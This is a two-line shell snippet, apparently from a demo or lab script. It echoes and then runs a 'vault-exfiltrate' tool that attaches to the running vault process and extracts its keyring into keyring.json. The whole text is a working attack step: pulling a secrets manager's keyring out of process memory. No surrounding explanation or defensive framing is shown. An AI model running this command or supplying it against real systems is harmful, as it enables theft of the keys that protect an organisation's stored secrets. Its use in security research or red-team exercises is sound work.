echo "Execute ./vault-exfiltrate extract \$\(pidof vault\) keyring_file | tee keyring.json"
./vault-exfiltrate extract $(pidof vault) keyring_file | tee keyring.json
